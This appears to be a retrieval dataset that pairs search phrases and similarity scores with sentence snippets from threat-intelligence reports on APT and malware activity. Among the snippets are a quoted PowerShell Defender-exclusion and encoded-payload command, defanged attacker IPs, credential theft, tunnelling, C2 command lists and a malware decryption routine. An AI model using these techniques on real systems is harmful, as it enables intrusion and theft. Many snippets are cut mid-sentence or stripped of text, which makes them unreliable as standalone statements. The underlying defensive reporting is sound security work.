Ngrok – a reverse proxy tool for proxying an internal service out onto an Ngrok domain|0.7587775823618571|['The exploit payload created a Scheduled Task [T1053.005] that executed RuntimeBroker.exe daily as SYSTEM.', 'Note: By exploiting Log4Shell, the actors gained access to a VMware service account with administrator and system level access.', 'The Scheduled Task was named RuntimeBrokerService.exe to masquerade as a legitimate Windows task.See MAR 10387061-1.v1 for additional information, including IOCs, on these four files.After obtaining initial access and installing XMRig on the VMWare Horizon server, the actors used RDP [T1021.001] and the built-in Windows user account DefaultAccount [T1078.001] to move laterally [TA0008] to a VMware VDI-KMS host.', 'Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from transfer[.', ']sh server associated with 144.76.136[.]153.', 'The actors downloaded the following tools:PsExec a Microsoft signed tool for system administrators.Mimikatz a credential theft tool.Ngrok a reverse proxy tool for proxying an internal service out onto an Ngrok domain, which the user can then access at a randomly generated subdomain at *.ngrok[.]io.', 'CISA has observed this tool in use by some commercial products for benign purposes; however, this process bypasses typical firewall controls and may be a potentially unwanted application in production environments.', 'Ngrok is known to be used for malicious purposes.', '[1]The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account [T1136.002].', 'Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network.', 'Upon logging into each host, the actors manually disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files.']
The actors were able to proxy [T1090] RDP sessions, which were only observable on the local network|0.7609383071739947|"['Ngrok is known to be used for malicious purposes.', '[1] The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account [T1136.002].', 'Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network.', 'Upon logging into each host, the actors manually disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files.', 'The threat actors were able to implant Ngrok on multiple hosts to ensure Ngroks persistence should they lose access to a machine during a routine reboot.', 'The actors were able to proxy [T1090] RDP sessions, which were only observable on the local network as outgoing HTTPS port 443 connections to tunnel.us.ngrok[.', ']com and korgn.su.lennut[.', ']com Page 3 o f 14 | Product ID: AA22-320A TLP:CLEARTLP:CLEAR CISA | FBI `` (the prior domain in reverse).', 'It is possible, but was not observed, that the threat actors configured a custom domain, or used other Ngrok tunnel domains, wildcarded here as *.ngrok[.', ']com, *.ngrok[.', ']io, ngrok.*.tunnel[.']"
The actors were able to proxy [T1090] RDP sessions, which were only observable on the local network|0.7609383071739947|['Ngrok is known to be used for malicious purposes.', '[1]The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account [T1136.002].', 'Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network.', 'Upon logging into each host, the actors manually disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files.', 'The threat actors were able to implant Ngrok on multiple hosts to ensure Ngroks persistence should they lose access to a machine during a routine reboot.', 'The actors were able to proxy [T1090] RDP sessions, which were only observable on the local network as outgoing HTTPS port 443 connections to tunnel.us.ngrok[.', ']com and korgn.su.lennut[.', ']com (the prior domain in reverse).', 'It is possible, but was not observed, that the threat actors configured a custom domain, or used other Ngrok tunnel domains, wildcarded here as *.ngrok[.', ']com, *.ngrok[.', ']io, ngrok.*.tunnel[.']
The exploit payload then downloaded mdeploy.text|0.7953734665347602|"['including PsExec, Mimikatz, and Ngrok.', 'INCIDENT RESPONSE If suspected initial access or compromise is detected based on IOCs or TTPs in this CSA, CISA encourages organizations to assume lateral movement by threat actors and investigate connected systems and the DC.', 'CISA recommends organizations apply the following steps before applying any mitigations, including patching.', '1.', 'Immediately isolate affected systems.', '2.', 'Collect and review relevant logs, data, and artifacts.', 'Take a memory capture of the device(s) and a forensic image capture for detailed analysis.', 'Page 11 of 14 | Product ID: AA22-320A TLP:CLEARTLP:CLEAR CISA | FBI `` 3.', 'Consider soliciting support from a third-party incident response organization that can provide subject matter expertise to ensure the actor is eradicated from the network and to avoid residual issues that could enable follow-on exploitation.', '4.']"
The exploit payload then downloaded mdeploy.text|0.7953734665347602|"['As trusted-third party reporting associated Log4Shell activity from 51.89.181[.', ']64 with lateral movement and targeting of DCs, CISA suspected the threat actors had moved laterally and compromised the organizations DC.From mid-June through mid-July 2022, CISA conducted an onsite incident response engagement and determined that the organization was compromised as early as February 2022, by likely Iranian government-sponsored APT actors who installed XMRig crypto mining software.', 'The threat actors also moved laterally to the domain controller, compromised credentials, and implanted Ngrok reverse proxies.Threat Actor ActivityIn February 2022, the threat actors exploited Log4Shell [T1190] for initial access [TA0001] to the organizations unpatched VMware Horizon server.', 'As part of their initial exploitation, CISA observed a connection to known malicious IP address 182.54.217[.', ']2 lasting 17.6 seconds.The actors exploit payload ran the following PowerShell command [T1059.001] that added an exclusion rule to Windows Defender [T1562.001]:powershell try{Add-MpPreference -ExclusionPath \'C:\\\\\'; Write-Host \'added-exclusion\'} catch {Write-Host \'adding-exclusion-failed\' }; powershell -enc ""$BASE64 encoded payload to download next stage and execute it""The exclusion rule allowlisted the entire c:\\\\drive, enabling threat actors to download tools to the c:\\\\drive without virus scans.', 'The exploit payload then downloaded mdeploy.text from 182.54.217[.', ']2/mdepoy.txt to C:\\\\users\\\\public\\\\mde.ps1 [T1105].', 'When executed, mde.ps1 downloaded file.zip from 182.54.217[.', ']2 and removed mde.ps1 from the disk [T1070.004].file.zip contained XMRig cryptocurrency mining software and associated configuration files.WinRing0x64.sys XMRig Miner driverwuacltservice.exe XMRig Minerconfig.json XMRig miner configurationRuntimeBroker.exe Associated file.', 'This file can create a local user account [T1136.001] and tests for internet connectivity by pinging 8.8.8.8 [T1016.001].', 'The exploit payload created a Scheduled Task [T1053.005] that executed RuntimeBroker.exe daily as SYSTEM.']"
removed mde.ps1 from the disk|0.8040615062110389|"[']2 lasting 17.6 seconds.', 'The actors exploit payload ran the following PowerShell command [T1059.001] that added an exclusion tool to Windows Defender [T1562.001]: powershell try{AddMpPreference ExclusionPath \'C:\\\\\'; WriteHost \'added exclusion\'} catch {WriteHost \'addingexclusionfailed\' }; powershell enc ""$BASE64 encoded payload to download next stage and execute it"" Page 2 o f 14 | Product ID: AA22-320A TLP:CLEARTLP:CLEAR CISA | FBI `` The exclusion tool allowlisted the entire c:\\\\drive, enabling threat actors to download tools to the c:\\\\drive without virus scans.', 'The exploit payload then downloaded mdeploy.text from 182.54.217[.', ']2/mdepoy.txt to C:\\\\users\\\\public\\\\mde.ps1 [T1105].', 'When executed, mde.ps1 downloaded file.zip from 182.54.217[.', ']2 and removed mde.ps1 from the disk [T1070.004].', 'file.zip contained XMRig cryptocurrency mining software and associated configuration files.', 'WinRing0x64.sys XMRig Miner driver wuacltservice.exe XMRig Miner config.json XMRig miner configuration RuntimeBroker.exe Associated file.', 'This file can create a local user account [T1136.001] and tests for internet connectivity by pinging 8.8.8.8 [T1016.001].', 'The exploit payload created a Scheduled Task [T1053.005] that executed RuntimeBroker.exe daily as SYSTEM.', 'Note: By exploiting Log4Shell, the actors gained access to a VMware service account with administrator and system level access.']"
$BASE64 encoded payload|0.7587193736016978|"['Figure 22.', ""PDB-paths discovered inside Prikormka's DOWNLOADER module."", 'DOWNLOADER module CORE module The main purpose of this component is to download the CORE module and ex- ecute it.', 'The DOWNLOADER module makes an HTTP request to one of its C&C The CORE module is responsible for communications with C&C servers and other servers, receives data, decrypts the data, saves it under the name hauthuid.dll tasks, including downloading additional modules, loading them, and uploading and then loads the DLL.', 'The communication is encrypted with the Blowfish cipher stolen data to the remote server.', 'and then base64 encoded.', 'Since this malware (and specifically the CORE module) has existed for several years, the details of implementation might vary, but the main concept of the CORE module has remained unchanged over the years.', 'The concept of the Prikormka malware is simple: the CORE module downloads additional components, which are used to harvest various types of data.', 'When such a component is loaded, it gathers sensitive information and saves this information to some specific log file.', 'The log file might store collected data in plain-text or it may be encrypted.', 'The CORE module checks periodically for such log files and when a log is available, it uploads it to the remote server.']"
$BASE64 encoded payload|0.7959408053947736|['The exploitation method used in this campaign relies upon a remote Office template injection method, a technique that we have seen state actors use recently.', 'However, it is not uncommon to use tools such as EvilClippy to manipulate the behavior of Microsoft Office documents.', 'For example, threat actors can use pre-built kits to manipulate clean documents and embed malicious elements; this saves time and effort.', 'This method will generate a consistent format that can be used throughout campaigns.', 'As a result, we have observed a consistency with how some of the malicious elements are embedded into the documents (i.e.', 'double base64 encoded payload).', 'Further mapping these techniques across the MITRE ATT&CK framework enables us to visualize different techniques the adversary used to exploit their victims.', 'MITRE ATT&CK mapping for malicious documents These Microsoft Office templates are hosted on a command and control server and the downloaded link is embedded in the first stage malicious document.', 'The job postings from these lure documents are positions for work with specific US defense programs and groups: F-22 Fighter Jet Program Defense, Space and Security (DSS) Photovoltaics for space solar cells Aeronautics Integrated Fighter Group Military aircraft modernization programs Like previous operations, the adversary is using these lures to target individuals, likely posing as a recruiter or someone involved in recruitment.', 'Some of the job postings we have observed: Senior Design Engineer System Engineer Professional networks such as LinkedIn could be a place used to deliver these types of job descriptions.', 'Defensive Architecture Recommendations Defeating the tactics, techniques and procedures utilized in this campaign requires a defense in depth security architecture that can prevent or detect the attack in the early stages.']
$BASE64 encoded payload|0.7627454803197186|['Figure 1 shows how malware sent via LinkedIn can infect a host.', 'Figure 1: Flow of malware infection The file sent via LinkedIn is compressed in RAR format and, when extracted, contains a Windows Help file (CHM file).', 'When this file is executed, it downloads and executes an external Windows Installer file (MSI file).', 'The executed MSI file uses a PowerShell script to download and execute an additional MSI file (Administrator-a214051.msi in Figure 1; the file name is [user name of the user who executed it]-a[5 random digits]1.msi).', 'This MSI file has the ability to send information about infected hosts, and the information is sent by HTTP POST request as shown below.', 'The information is Base64 encoded.', 'POST /test.msi HTTP/1.1 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Accept: */* Accept-Language: ja-JP User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5) Content-Length: [Size] Host: [Server name] VGltZToJV2VkIERl(...) Figure 2 shows a part of the malware code for collecting information about the infected host.', 'You can see that it is written in JScript.', '1/7Figure 2: Part of the malware code In addition, we have confirmed that the LinkedIn accounts that contact the target send malware disguising themselves as those who offer jobs.', 'Figure 3 shows the LinkedIn account that contacted a target, and we consider it had been compromised by the attacker.', 'We have not yet figured out how the attackers compromised SNS accounts so far.']
$BASE64 encoded payload|0.7959408053947736|['These job descriptions are legitimate and taken directly from the defense contractors website.', 'The exploitation method used in this campaign relies upon a remote Office template injection method, a technique that we have seen state actors use recently.However, it is not uncommon to use tools such as EvilClippy to manipulate the behavior of Microsoft Office documents.', 'For example, threat actors can use pre-built kits to manipulate clean documents and embed malicious elements; this saves time and effort.', 'This method will generate a consistent format that can be used throughout campaigns.', 'As a result, we have observed a consistency with how some of the malicious elements are embedded into the documents (i.e.', 'double base64 encoded payload).', 'Further mapping these techniques across the MITRE ATT&CK framework enables us to visualize different techniques the adversary used to exploit their victims.MITRE ATT&CK mapping for malicious documentsThese Microsoft Office templates are hosted on a command and control server and the downloaded link is embedded in the first stage malicious document.The job postings from these lure documents are positions for work with specific US defense programs and groups:F-22 Fighter Jet ProgramDefense, Space and Security (DSS)Photovoltaics for space solar cellsAeronautics Integrated Fighter GroupMilitary aircraft modernization programsLike previous operations, the adversary is using these lures to target individuals, likely posing as a recruiter or someone involved in recruitment.', 'Some of the job postings we have observed:Senior Design EngineerSystem EngineerProfessional networks such as LinkedIn could be a place used to deliver these types of job descriptions.Defensive Architecture RecommendationsDefeating the tactics, techniques and procedures utilized in this campaign requires a defense in depth security architecture that can prevent or detect the attack in the early stages.', 'The key controls in this case would include the following:Threat Intelligence Research and Response Program.', 'Its critical to keep up with the latest Adversary Campaigns targeting your specific vertical.', 'A robust threat response process can then ensure that controls are adaptable to the TTPs and, in this case, create heightened awarenessSecurity Awareness and Readiness Program.The attackers leveraged spear-phishing with well-crafted lures that would be very difficult to detect initially by protective technology.']
sends it to the C2 server.|0.7649494654955431|['REDBULL Sets cafe flag to 1 active.', 'SLOWCOW Sets cafe flag to 0 slow mode.', 'Runs specified process and logs its output, then prepares this output log for X uploading to the C2.', 'T Obtains list of files from a specific directory.', 'TAUTH Obtains list of files of remote server if specified credentials are valid.', 'G Sends a file to the C2.', 'GAUTH Downloads a particular file from a shared resource if specified credentials 4/6are valid.', 'SPLIT Splits file into 400 KB parts and uploads them to the C2.', 'FLUSH Sends file with the data collected by all components that day and deletes it.', 'C1 C4 Sets the C2 in its configuration in the registry (C1-C4).', 'TL1 TL3 Sets the active state in its configuration in the registry (T1-T3).']
decrypts the Orchestrator|0.7544639559953863|['ESET Research White Paper // May 2020 FROM AGENT.BTZ TO COMRAT V4 A ten-year journey Matthieu FaouTABLE OF CONTENTS 1.', 'Executive Summary .', '.', '.', '.', '.', '.', '.']
obfuscated DLL|0.7701069368934773|['While it was initially used solely by APT41, it started being shared among multiple Chinese threat actors in 2019.', 'In the case of Earth Lusca, the malware has the same features, but they added an extra layer of obfuscation, making it very different from the Shadowpad samples used by other groups.', 'In this case, the ShadowPad samples are composed of three components: a valid code signed executable, a DLL loader, and an encrypted payload.', 'The obfuscation technique used by ShadowPad has previously been described: a function is called before each instruction, which will redirect the code flow to the next instruction, making it very difficult to follow.', 'In addition, some useless comparisons are added to overload the code.', 'The DLL loader is obfuscated.', 'Its role is to search and load the payload file, which is obfuscated in the same manner as the DLL file.', 'If the payload file is found, its code is copied to the registry and the file is deleted.', 'The next time it runs, the payload will be loaded from the registry.', 'This way, it is not possible to recover the final payload using only the DLL loader and without the registry content.', 'Some of the decrypted configurations we found contained the mm_telecom keyword, which might indicate a possible target.']
API function|0.7681291715323914|['ESET Research Whitepapers // August 2018 TURL A OUTLOOK BACKDOOR Analysis of an unusual Turla backdoor2 Turla Outlook Backdoor // Analysis of an unusual Turla backdoor 1.', 'CONTENTS 1.', 'Introduction.', '.', '.', '.', '.', '.', '.']
API function|0.7681291715323914|"[': //http://localhost:3699/api/GetSources?Type=3&start=1532620329&end=1532620329 : [ { ""Type"": 3, ""IP"": """", 23""Mac"": """", ""Name"": "" Scotland Redmoss 1,9km"", ""StationNumber"": """", ""Time"": 1532563200000, ""GeoX"": 57.13, ""GeoY"": -2.12, ""Extras"": ""Vsat "" }, { ""Type"": 3, ""IP"": """", ""Mac"": """", ""Name"": ""iDirect HUB iNFINITI"", ""StationNumber"": """", ""Time"": 1538572327000, ""GeoX"": 55.784,""GeoY"": 37.486, ""Extras"": ""-NSS 7; -Ku-3 Norsat; -Vertical; -12558014279; vsat_-iDirect HUB iNFINITI; _-1538572327; - 55,784|37,486; - Moscow Oblast Khoroshevo-Mnevniki (159000) 0,9km"" }, ... ]   1.   : {ip}:9850/api/GetState : [ { ""Id"": 1, ""Name"": """", ""Status"": ""Ok"", ""Message"": "" .', ': 478"" },... ]  1.   id : {ip}:9850/api/KeyWords/{id} //GET : id  .', ': //http://localhost:3699/api/KeyWords/1 [ { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [""*"",""Sergy*"",""356"",""Test rub 358999"",""Last Add rub 66""] }, 24{ ""ID"": 1, ""Language"": ""CA"", ""KeyWords"": [""ARRAMBADA"",""BANDARRA"",""BARRINAR"",""BOLLERA"",""BOLLICAO"",""CAGANER"", ""CARDAR"",""CASCAR&SE&LA"",""COLLONS"",""CONSOLADOR"",""CONY"",""CUL"",""ESCALFAPOLLES"",""FAR RANACO"",""FER&UN&RIU"", ""FIGA"",""FILL&DE&PUTA"",""FILL&DE&VERRA"",""FOLLADOR"",""FOLLAR"",""FURNICAR"",""GALLUMBOS"","" GILIPOLLES"",""HINYAR "",""LLEPAR"",""LLETERADA"",""MAMADA"",""MANOLA"",""MARIETA"",""MARIPILI"",""PAJARITO"",""PARRS"",""P ELAR&SE&LA"",""PUT A"",""PUTOT"",""TREMPERA"",""TXITX*"",""XONA"",""XUFA""] }, { ""ID"": 1, ""Language"": ""CS"", ""KeyWords"": [""BUZERANT"",""CHUJ"",""HOVNO"",""KOULE"",""KUNDA"",""KURVA"",""PRDEL"",""VEJCE"",""ZMRD""] },... ] 2.   id .', 'POST.', ': { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [ ""*"", ""Sergy*"", ""356"", ""Test rub 358999"", ""Last Add rub 667"" ] }   1.  : {ip}:9850/api/rubriclist?Parent=-1 //  {ip}:9850/api/rubriclist?Parent=20 //  Parent=20 : [ { ""ID"": 0, ""ID1"": 0, ""Parent"": null, ""Name"": ""Uknown"" }, { ""ID"": 1, ""ID1"": 1, ""Parent"": 0, ""Name"": ""Garbage"" 25},... ] : Url=""/json/rubrics/5 2.  : {ip}:9850/api/rubriclist api/LanguageList : [ { ""ID"": 0, ""ID1"": 0, ""ShortName"": ""UN"", ""Name"": ""UN-Unknown"" }, { ""ID"": 1, ""ID1"": 1, ""ShortName"": ""AA"", ""Name"": ""AA-Afar"" }, { ""ID"": 2, ""ID1"": 2, ""ShortName"": ""AB"", ""Name"": ""AB-Abkhazian"" },... ] API     .', '.', ',     .', '.', '-    .', '26      -     ,    (),  (),   ().', '-  .']"
API function|0.7681291715323914|['19 Corelan Team.', 'Starting to write Immunity Debugger PyCommands : my cheatsheet.', 'January 2010.', '10 www.fireeye.comPoison Ivy: Assessing Damage and Extracting Intelligence Defenders View Attackers View Starting ChopShop Initializing Modules ... Initializing module poisonivy_23x Transferred files will be saved.. Screen/Cam/Audio/Key captures will be saved.. Running Modules ... [2013-07-03 06:46:29 PDT] Poison Ivy Version:2.32 [2013-07-03 06:46:30 PDT]*** Host Information*** PI profile ID: mal IP address: 192.168.0.12 Hostname: BLUE Windows User: admin Windows Version: Windows XP Windows Build: 2600 Service Pack: Service Pack 3 [2013-07-03 06:46:36 PDT] *** Shell Session *** Microsoft Windows XP [Version 5.1.2600] (C) Copyright 1985-2001 Microsoft Corp. C:\\\\> [2013-07-03 06:46:42 PDT] *** Shell Session *** ipconfig [2013-07-03 06:46:43 PDT] *** Shell Session *** Windows IP Configuration Connection-specific DNS Suffix .', ': IP Address.', '.', '.', '.', '.', '.', '.']
API function|0.7681291715323914|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
API function|0.7681291715323914|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
various WinAPI functions.|0.7649492746213751|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
 NtQueueAPCThread function|0.7665650083196298|['GetTickCount = GetProcAddress(&pKernel32Module, pKernel32Module.GetTickCount); 28. if ( GetTickCount() - uTicks < 1000 ) 29. return 1; 30.', '31.', '// Get unhooked APIs 32. pUnhookedAPIs = InitializeKernel32ExportList(&UnhookedAPIs); 33.', '34.', '// Check if DLL was executed by Note.exe or rundll32.exe 35. szSystem32Path = DecryptString(szencSystem32Path); 36. if ( !CheckFileName(&pKernel32Module, *szSystem32Path) ) 37. return 1; 38.', '39.', '// Stard main routine 40.', 'CreateThread = GetProcAddress(&pKernel32Module, szCreateThread); 41. hThread = CreateThread(0, 0, InjectThead, 0, 0, &v57); 42.', '43.', '// Wait for new theread to finish execution 44.', 'WaitForSingleObject = GetProcAddress(&pKernel32Module, szWaitForSingleObject); 45.']
 NtQueueAPCThread function|0.9075894799698507|['How many parameters does it expect?', '3.', 'Can we do this?', 'Yes.', 'How?', 'NtQueueApcThread!', 'See main_ApcWriteProcessMemory (https://github.com/BreakingMalwareResearch/atom- bombing/blob/f5a04e3fd6eda114e1a7e66429d7e9ec864ec7d4/AtomBombing/main.cpp#L822) in AtomBombings GitHub repository (https://github.com/BreakingMalwareResearch/atom-bombing).', 'AtomBombing Stage 2: Execution Obviously I could never hope to consistently find RWX code caves in my target processes.', 'I needed a way to consistently allocate RWX memory in the target process without calling VirtualAllocEx within the context of the injecting process.', 'Sadly, I could not find any such function that I could invoke via APC and would allow me to allocate executable memory or change the protection flags of already allocated memory.', 'What do we have so far?']
encrypted with RC4|0.7556436364144342|['with an exterior routing protocol.', 'If one of these stolen IP addresses was detected as the source of fraudulent All this information would be appended to a big string, which activity, it was easily burned and recycled, while the same was RSA-encrypted (with a hard-coded key) and sent to the bots continued running in the data centers behind it.', 'The server.', 'To be clear, the first message included both the user operations ability to continuously find new IPs through info and the RC4 key, and was encrypted with an RSA public which to proxy gave it a layer of protection and isolation, key.', 'If the C2 confirmed that it was safe to start executing avoiding any single point of failure that could allow us commands, the following messages would be quickly to easily eradicate it.', 'encrypted with RC4 using the previously generated RC4 key.', 'The ad fraud bot operation was comprised of Miuref/Boaxxe infected-computers.', 'This bot farm largely relied on Chrome and Internet Explorer.', 'While the number of IPs hijacked from corporations ranged from 200,000 to 500,000 at any given time, the malware infection footprint appears to have remained at less than 5,000 infections across the globe.', 'The Hunt for 3ve 17pn:C:\\\\Test\\\\eve.exe un:davidcopperfield cn:DESKTOP-1Z8V3O1 cpu:1,1,Intel(R) Core(TM) i7-6600U CPU @ 2.60GHz sk: uwomanrx (RC4 Key used for future communication) Message sent and encrypted for 3ve.1 to start executing commands.', 'After encryption Before encryption and encoding FRO ------- FRO ------- ]8  NEp93E3ShqSVbIkH u:xxxxxxxxx64a7 %2bgCQtnG8K48bJw 22054c8c2888ef93 K0gQTlgf2Gm6VuqN bbo:6.2.9200b: 5OEk44MqJ5LFuxks 64a:0c:1v:100 6mirocIQphD998Vp s:0r:11:2000 WHu8HW1C53yM2O1O d:12n:5cp:10c oRmwt36Gi7hqZe3Y r:f0546e28bt:1d FbIvuXJWorsWoyF% 225ec.f1c7fa10p 2fuUus7DcnJNasY1 n:C:\\\\Test\\\\eve.ex Skv8BnBufphvW1cO eun:mXXXXXacocn OKv8mWdVLGY6Q0z7 :DESKTOP-1XXXX01 3fhWzi44rKyJIdxd cpu:1,1,Intel(R dakdAhiWU%2bvEmj ) Core (TM) i7-66 eryzYLVOLiJA03%2 00U CPU @2.60GH fkJGN51GvBDTrn04 z MYnpx4rxLpXkw9nb 3ve.1 messages before and after encryption and encoding.']
encrypted with RC4|0.7683613692937954|"['That configuration is decrypted with a simple XOR operation: def simplecrypt(x): return xor(x, b""\\\\xad"" + x[:-1]) Next, the sample finds the explorer.exe process and uses it to change the token of the current thread.', 'It then writes logs to a temporary file (%TEMP%/TS_FB56.tmp), but only if the file already exists.', 'These logs are encrypted and the encryption algorithm used is AES256-CBC with 8192 rounds of SHA256: def decrypt(datasample): key = b\'\\\\x53\\\\x12\\\\x76\\\\x23\\\\x94\\\\x89\\\\x78\\\\x45\\\\x58\\\\x31\\\\x62\\\\x83\\\\x77\\\\x95\\\\x59\\\\x17\\\\x31\\\\x47\\\\x73\\\\x50\\\\x22\\\\x34\\\\x65\\\\x89\\\\x49\\\\x12\\\\x67\\\\x41\\\\x90\\\\x35 2/5realkey = datasample[:0x10]+ b\'\\\\x00\' * 0x10 for i in range(0x2000): realkey = hashlib.sha256(realkey + key).digest() raw = aes.cbc.decrypt(realkey, datasample[:16], datasample[16:]) print(""checksum"", raw[-32:].hex()) return raw[:-32] The encryption key is hardcoded, and was previously used in an older sample of this malware.', 'The same encryption algorithm is used for network communication.', 'The encrypted data structure is as follows: struct encrypted_data { byte[16] IV; byte[N] message_data; // always divisible by 16, padding added as necessary byte[32] sha256_checksum; } The sample stores configuration and state in the following file: %appdata%/microsoft/protect/windows/DMI%X.DAT (where %X is variable and depends on the parameter with which sample was started).', 'It is also encrypted, but with RC4.', 'This key was hardcoded in older versions of Sagerunex, but recent samples started to read the key from configuration instead.', 'The config file modification date will always be in the year 2011 the file last edit year is changed by the malware to 2011.', 'Network communication In normal mode, the sample will try all the following supported connection modes in this order.', 'In all cases, HTTPS is used, with user agent equal to: Mozilla/5.0 (compatible; MSIE 7.0; Win32).', '- 1: httpsviaconfigproxy: HTTPS with configured proxy - 2: httpswpadproxy: instead of using configured proxy, use proxy provided by WPAD mechanism (web proxy autodiscovery) - 3: httpsviaiexproxy: self-explanatory.']"
encrypted with RC4|0.7517921660991123|"['RenF Rename file in the system.', 'Communication with C2 over SSL In CheckPoints report from 2015, they identify two communications methods: Communication over HTTP (Port 80) to a dynamic C&C server update server, and communication with a static update server.', 'Moreover, the identified using of RAW TCP for communication with the C&C server.', 'The URL and IP addresses were hard-coded stings in the explosive file.', 'In our analysis, we found a new method communication over HTTPS (Port 443).', 'The data is encrypted with RC4 method.', 'Similar to the original methods, the RC4 decryption key is a hard-coded string as well.', 'Further information about the malware can be found in the CheckPoints technical report.', '____________________________________________________________________________________________________ www.clearskysec.com All rights reserved to ClearSky Cyber Security ltd. 2021 TLP: WHITE 21 | P ageAttribution Lebanese Cedar APT is a stealth threat actor, which is active for more than 8 years.', 'In this report, we uncover the updated malicious activity of this threat actor in Israel and other countries world-wide.', 'As presented in the map on the executive summary, Lebanese Cedar operates under the radar for more than 5 years, since the last report that covered their operation.']"
encrypted with RC4|0.780139459616412|['However, its interesting that the BE2 developers created wiper code different from the Destover and Shamoon wiper malware we saw in the Saudi Aramco and SPE attacks.', 'Instead of re-using the commercial EldoS RawDisk drivers in their malware, the BE2 developers wrote their own low-level disk and file destruction routines.', 'Its also a much more chilling deployment of wipers instead of a poorly defended media studio, it was delivered to ICSenvironments.', 'In order to overwrite stored data on all Windows versions, the dstr plugin supports both user-mode and kernel-mode wiper functionality, which is somewhat surprising.', 'The component maintains both an embedded win32 library and win64 driver modules for its kernel mode functionality.', 'They are rc4 encrypted.', 'User-mode functionality The plugin identifies device ids for the systems HDD and creates a handle to the systems physical drive, with GENERIC_READ or GENERIC_WRITE access.', 'Several calls to DeviceIoControl collects data on the physical location of the volume, and the size and properties of this disk.', 'It uses DeviceIoControl with the IOCTL_DISK_GET_DRIVE_GEOMETRY control code in order to retrieve Bytes Per Sector value.', 'dstr then wipes out all open handles to the disk by dismounting it with the FSCTL_DISMOUNT_VOLUME control code.', 'This routine prepares the system for overwrite and ensures no conflicts for plugin file I/O.']
search, delete files.|0.7871199697349905|"['Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""', ""The authors have also created skeleton code in preparation for implementing video capture from Web cameras, though it hasn't been implemented yet."", 'USB Dump The USB Dump capability gives the attackers the ability to: 7/12Enumerate files for path ""LOCAL_APPDATA\\\\GDIFONTC"".', 'Delete files.']"
file listings|0.809938717517259|['Figure 13: A screenshot exfiltrated from victims Windows device on adobeair[.', ']net Skype Logs Databases - The data included the entire Skype AppData folder for certain victims, including messaging databases.', 'Photos - This data included complete contents of the Pictures folder from compromised Windows machines.', 'It is common to see smartphone photos backed up to this location, which most often contains personal photographs of family and friends taken by the individual being targeted.', '15SECURITY RESEARCH REPORT iPhone Backups - This data included an entire unencrypted backup of a victims iPhone.', 'File Listings - This data included all default Windows folders and file listings.', 'Corporate and Legal Documentation - This data included a large collection of company-specific documents.', 'Specifically, we discovered these on another live command and control server, planethdx[.]com.', 'Figure 14: An example of corporate documentation, which details the addresses and telephone numbers of customers for a shipping company 16SECURITY RESEARCH REPORT Patterns of Attacks Dark Caracal follows the typical attack chain for client-side cyber-espionage.', 'Mobile tools include a custom written Android surveillanceware implant Lookout named Pallas9 and a previously unknown FinFisher sample.', 'The groups desktop tools include the Bandook malware family and a newly discovered desktop surveillanceware tool that we have named CrossRAT, which is able to infect Windows, Linux, and OS X operating systems.']
scheduled task properties|0.7544517219972202|['Copyright Leonardo S.p.a. All rights reserved 22 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE ATT&CK TTPs T1059 Command-Line Command-line interfaces provide a way of interacting with computer Interface systems and is a common feature across many types of operating system platforms.', 'One example command-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc.', 'Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a well-established method used by both defenders and adversaries to hide open ports from access.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened.', 'Usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.', 'T1105 Remote File Files may be copied from one system to another to stage adversary Copy tools or other files over the course of an operation.']
